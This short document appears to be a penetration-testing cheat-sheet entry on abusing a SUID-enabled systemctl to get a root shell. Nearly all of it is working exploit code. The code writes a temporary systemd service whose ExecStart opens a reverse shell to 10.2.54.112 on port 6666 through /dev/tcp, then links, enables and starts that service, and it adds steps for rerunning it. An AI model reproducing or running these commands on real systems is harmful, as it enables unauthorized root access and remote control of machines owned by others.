
If we have a `Systemctl` command with enabled SUID bit we can exploit it to get a root shell using the following command:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.2.54.112/6666 0>&1"
[Install]
WantedBy=multi-user.target' > $TF
#then we can use either these commands to start the service
systemctl link $TF
systemctl enable --now $TF
# or these
systemctl enable $TF
systemctl start <filename without path)>
```

**Important Note: if we want to run the service once again, we can use the following command:**

```bash
echo $TF #to get the file name and path, then we run the file but without the path
systemctl start <filename without path>
```
